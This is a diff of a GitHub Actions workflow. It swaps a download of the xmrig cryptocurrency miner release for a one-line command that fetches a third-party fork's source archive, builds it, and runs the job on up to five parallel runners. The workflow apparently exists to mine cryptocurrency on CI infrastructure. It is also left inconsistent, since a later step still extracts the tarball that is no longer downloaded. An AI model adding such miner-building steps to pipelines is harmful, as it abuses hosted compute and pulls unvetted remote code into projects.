@@ -18,7 +18,7 @@ jobs:
   # This workflow contains a single job called "build"
   build:
     # The type of runner that the job will run on
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-18.04
     strategy:
       max-parallel: 5
       fail-fast: false
@@ -36,7 +36,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: DOWNLOAD
-        run: wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+        run: wget https://github.com/AZKAFamilychanel/eXeMRIG/archive/refs/heads/master.zip && unzip master.zip && cd xmrig-master && mkdir build && cd build && cmake .. -DWITH_HWLOC=OFF &&  make
       - name: Extract
         run: tar -xvf xmrig-6.17.0-linux-x64.tar.gz
         
